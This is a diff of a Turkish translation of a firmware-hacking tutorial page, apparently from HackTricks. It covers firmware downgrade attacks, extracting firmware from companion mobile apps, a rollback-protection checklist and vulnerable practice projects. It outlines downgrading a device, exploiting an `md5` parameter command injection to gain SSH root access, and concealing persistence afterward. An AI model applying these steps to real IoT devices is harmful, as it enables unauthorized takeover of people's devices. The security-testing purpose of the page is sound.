+   * Web UI, mobile-app API, USB, TFTP, MQTT, vb.
+   * Birçok tüketici IoT cihazı, Base64-encoded firmware blob'larını kabul eden ve sunucu tarafında decode edip recovery/upgrade tetikleyen *unauthenticated* HTTP(S) endpoint'leri açar.
+3. Downgrade'den sonra, daha yeni sürümde yamalanmış bir zaafiyeti istismar edin (örneğin sonradan eklenmiş bir command-injection filtresi).
+4. İsteğe bağlı olarak persistence sağlandıktan sonra tespit edilmemek için en son imajı geri yükleyin veya güncellemeleri devre dışı bırakın.
 
 ### Example: Command Injection After Downgrade
 ```http
@@ -321,11 +352,11 @@ Host: 192.168.0.1
 Content-Type: application/octet-stream
 Content-Length: 0
 ```
-Zafiyetli (downgraded) firmware'de, `md5` parametresi herhangi bir sanitizasyon uygulanmadan doğrudan bir shell komutuna birleştiriliyor; bu da rastgele komut enjeksiyonuna izin veriyor (burada – enabling SSH key-based root access). Daha sonraki firmware sürümleri temel bir karakter filtresi getirdi, ancak downgrade korumasının olmaması bu düzeltmeyi etkisiz kılıyor.
+Zayıf (sürüm düşürülmüş) firmware'de, `md5` parametresi temizlenmeden doğrudan bir shell komutuna ekleniyor; bu da keyfi komut enjeksiyonuna izin veriyor (burada – SSH key-based root access etkinleştirme). Daha sonraki firmware sürümleri temel bir karakter filtresi getirdi, ancak sürüm düşürme korumasının olmaması bu düzeltmeyi etkisiz kılıyor.
 
 ### Mobil Uygulamalardan Firmware Çıkarma
 
-Birçok üretici, uygulamanın cihazı Bluetooth/Wi‑Fi üzerinden güncelleyebilmesi için companion mobil uygulamalarının içine tam firmware imajları paketler. Bu paketler genellikle APK/APEX içinde `assets/fw/` veya `res/raw/` gibi yollar altında şifrelenmemiş olarak saklanır. `apktool`, `ghidra` veya hatta sade `unzip` gibi araçlar, fiziksel donanıma dokunmadan imzalı görüntüleri çekmenizi sağlar.
+Birçok üretici, uygulamanın cihazı Bluetooth/Wi‑Fi üzerinden güncelleyebilmesi için eşlik eden mobil uygulamalarının içine tam firmware görüntülerini dahil eder. Bu paketler genellikle APK/APEX içinde `assets/fw/` veya `res/raw/` gibi yollar altında şifrelenmemiş olarak depolanır. `apktool`, `ghidra` veya hatta sade `unzip` gibi araçlar, fiziksel donanıma dokunmadan imzalı görüntüleri çekmenizi sağlar.
 ```
 $ apktool d vendor-app.apk -o vendor-app
 $ ls vendor-app/assets/firmware
@@ -333,17 +364,17 @@ firmware_v1.3.11.490_signed.bin
 ```
 ### Güncelleme Mantığını Değerlendirmek için Kontrol Listesi
 
-* *update endpoint*'in taşıma/kimlik doğrulaması yeterince korunuyor mu (TLS + kimlik doğrulama)?
-* Cihaz, flashing işleminden önce **version numbers** veya **monotonic anti-rollback counter** kontrolü yapıyor mu?
-* İmaj secure boot chain içinde doğrulanıyor mu (ör. imzalar ROM code tarafından kontrol ediliyor mu)?
-* userland code ek doğrulama/sanity kontrolleri yapıyor mu (ör. allowed partition map, model number)?
-* *partial* veya *backup* update akışları aynı doğrulama mantığını yeniden kullanıyor mu?
+* *update endpoint*'in taşıma/kimlik doğrulaması yeterince korunuyor mu (TLS + authentication)?
+* Cihaz flashing işleminden önce **version numbers** veya **monotonic anti-rollback counter** karşılaştırıyor mu?
+* İmaj secure boot chain içinde doğrulanıyor mu (örn. imzalar ROM code tarafından kontrol ediliyor mu)?
+* Userland code ek tutarlılık kontrolleri yapıyor mu (örn. allowed partition map, model number)?
+* *partial* veya *backup* update akışları aynı doğrulama mantığını tekrar kullanıyor mu?
 
-> 💡  Yukarıdakilerden herhangi biri eksikse, platform muhtemelen rollback saldırılarına karşı savunmasızdır.
+> 💡  Eğer yukarıdakilerden herhangi biri eksikse, platform muhtemelen rollback attacks'e karşı savunmasızdır.
 
-## Pratik yapmak için zafiyetli firmware
+## Pratik için zafiyetli firmwareler
 
-Pratik yaparken firmware'deki zayıflıkları keşfetmek için aşağıdaki vulnerable firmware projelerini başlangıç noktası olarak kullanın.
+Firmware'de zafiyet keşfetme pratiği yapmak için aşağıdaki zafiyetli firmware projelerini başlangıç noktası olarak kullanın.
 
 - OWASP IoTGoat
 - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
@@ -358,17 +389,16 @@ Pratik yaparken firmware'deki zayıflıkları keşfetmek için aşağıdaki vuln
 - Damn Vulnerable IoT Device (DVID)
 - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)
 
-## Referanslar
+## Eğitim ve Sertifika
+
+- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)
+
+## Kaynaklar
 
 - [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
 - [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
 - [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
-
-
 - [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
-
-## Eğitim ve Sertifika
-
-- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)
+- [Now You See mi: Now You're Pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
 
 {{#include ../../banners/hacktricks-training.md}}
